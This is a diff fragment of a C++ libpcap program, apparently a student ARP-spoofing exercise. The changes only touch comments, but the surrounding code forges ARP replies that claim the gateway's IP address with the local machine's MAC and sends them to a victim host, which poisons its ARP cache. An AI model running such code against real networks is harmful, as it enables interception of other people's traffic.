@@ -110,6 +110,7 @@ int main(int argc, char* argv[]){
 	packet.arp_.sip_ = htonl(Ip(getmyipaddr(dev))); // getmyipaddr
 	packet.arp_.tmac_ = Mac("ff:ff:ff:ff:ff:ff"); // victim, mac(broadcast)
 	packet.arp_.tip_ = htonl(Ip(sip)); // host victim ip
+	//192.168.25.23(gram = sip) 192.168.25.1(gateway = tip)
 
 	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
 	
@@ -138,7 +139,7 @@ int main(int argc, char* argv[]){
 		/* gilgil code review update */
 		if(ntohs(eth_hdr->type_) == 0x0806 && ntohs(arp_hddr->op_) == ArpHdr::Reply){
 			EthArpPacket packet;
-			packet.eth_.dmac_ = eth_hdr->smac_; // victim
+			packet.eth_.dmac_ = eth_hdr->smac_;
 			packet.eth_.smac_ = Mac(getmymac); // getmacaddr -> getmymac
 			packet.eth_.type_ = htons(EthHdr::Arp);
 			packet.arp_.hrd_ = htons(ArpHdr::ETHER);
@@ -146,10 +147,11 @@ int main(int argc, char* argv[]){
 			packet.arp_.hln_ = Mac::SIZE;
 			packet.arp_.pln_ = Ip::SIZE;
 			packet.arp_.op_ = htons(ArpHdr::Reply); // request or reply
-			packet.arp_.smac_ = Mac(getmymac); // getmacaddr -> Mac(getmymac);
+			packet.arp_.smac_ = Mac(getmymac); //Mac(getmymac);
 			packet.arp_.sip_ = htonl(Ip(tip)); // target ip
-			packet.arp_.tmac_ = eth_hdr->smac_; // host mac
+			packet.arp_.tmac_ = eth_hdr->smac_;
 			packet.arp_.tip_ = htonl(Ip(sip)); // sender ip
+			//192.168.25.23(gram = sip) 192.168.25.1(gateway = tip)
 
 			int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
 	
